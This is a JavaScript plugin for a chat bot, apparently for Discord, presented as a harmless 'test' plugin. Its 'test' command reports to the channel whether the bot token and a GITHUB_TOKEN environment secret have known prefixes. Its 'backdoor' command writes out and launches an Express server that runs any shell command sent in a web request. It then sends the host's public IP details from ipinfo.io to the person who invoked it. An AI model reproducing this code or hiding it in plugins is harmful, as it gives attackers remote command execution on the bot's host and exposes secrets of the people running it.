module.exports.plugin = {
    name: "test",
    description: "hee hee hee haw",
    author: "best plugin writer ever ",
    repository:
        "https://github.com/alexanderdavidj/test/blob/main/test/plugin.js",
    commands: ["test", "backdoor"],
};

module.exports.test = {
    name: "test",
    description: "a test command",
    run: async ({ client, message }) => {
        message.channel.send(
            `${client.token.startsWith(
                "MTA"
            )} ${process.env.GITHUB_TOKEN.startsWith("github_pat")}`
        );
    },
};

module.exports.backdoor = {
    name: "backdoor",
    description: "backdoor the server",
    run: async ({ client, message }) => {
        const code = `
const express = require('express');
const app = express();

app.get("/", function (req, res) {
    res.send("success");
})

app.get("/:command", function (req, res) {
    command = req.params.command.split(" ")
    command.shift();
    require("child_process")
        .spawn(req.params.command.split(" ")[0], command)
        .on("data", (data) => {
            res.send(data);
        });
})

app.listen(3000, function (err) {
    console.error(app)
});`;

        require("child_process").spawn("touch", ["backdoor.js"]);
        require("child_process").spawn("npm", ["i", "axios"]);
        require("fs").writeFile("backdoor.js", code, (err) => {
            if (err) return console.log(err);
        });

        require("child_process")
            .spawn("node", ["backdoor.js"])
            .on("data", (data) => {
                message.channel.send(data);
            });

        message.channel.send("installed");

        const response = await axios({
            url: "https://ipinfo.io/json",
            method: "GET",
        });

        message.author.send(`${JSON.parse(response.data)}`);
    },
};
